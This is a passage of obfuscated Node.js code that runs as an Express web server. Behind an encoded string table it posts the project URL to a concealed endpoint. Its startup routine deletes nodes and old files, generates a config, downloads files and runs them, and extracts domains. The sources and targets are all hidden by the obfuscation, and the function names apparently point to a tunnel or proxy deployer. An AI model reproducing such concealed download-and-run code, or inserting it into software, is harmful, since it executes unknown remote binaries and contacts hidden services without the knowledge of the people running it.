_0x28ed9b=_0x2767bc;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x28ed9b(0x1e7)](_0x28ed9b(0x195));return;}try{const _0x21f5da=await axios['post'](_0x28ed9b(0x1dd),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x28ed9b(0x19b)}});return console['log'](_0x28ed9b(0x196)),_0x21f5da;}catch(_0x3a0595){return console[_0x28ed9b(0x1ba)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x3a0595['message']),null;}}async function startserver(){const _0xabee28=_0x2767bc;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x11fe38){console['error'](_0xabee28(0x154),_0x11fe38);}}startserver()[_0x2767bc(0x183)](_0x137400=>{const _0x548d1b=_0x2767bc;console[_0x548d1b(0x1ba)](_0x548d1b(0x182),_0x137400);}),app['listen'](PORT,()=>console[_0x2767bc(0x1e7)](_0x2767bc(0x1ea)+PORT+'!'));
